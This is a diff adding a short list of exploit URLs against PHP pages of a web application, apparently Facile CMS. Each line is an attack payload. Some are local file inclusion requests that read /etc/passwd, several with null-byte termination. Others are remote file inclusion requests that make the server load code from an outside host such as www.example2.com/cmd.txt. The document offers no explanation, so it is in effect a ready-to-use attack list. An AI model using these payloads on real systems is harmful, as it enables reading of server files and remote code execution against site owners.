@@ -1,0 +1,8 @@
+http://www.example.com/[FacilePath]/p-popupgallery.php?l=http://www.example2.com/cmd.txt?
+http://www.example.com/[FacilePath]/p-popupgallery.php?l=/etc/passwd%00
+http://www.example.com/[FacilePath]/p-editbox.php?pathfile=/etc/passwd
+http://www.example.com/[FacilePath]/p-editbox.php?pathfile=\\www.example2.com\file.php &lt;- php5
+http://www.example.com/[FacilePath]/p-editpage.php?pathfile=/etc/passwd
+http://www.example.com/[FacilePath]/p-editpage.php?pathfile=\\www.example2.com\file.php &lt;- php5
+http://www.example.com/[FacilePath]/p-themes/THEME/index.inc.php?mytheme=/etc/passwd%00
+http://www.example.com/[FacilePath]/index.php?mn=0&amp;pg=0〈=/etc/passwd%00
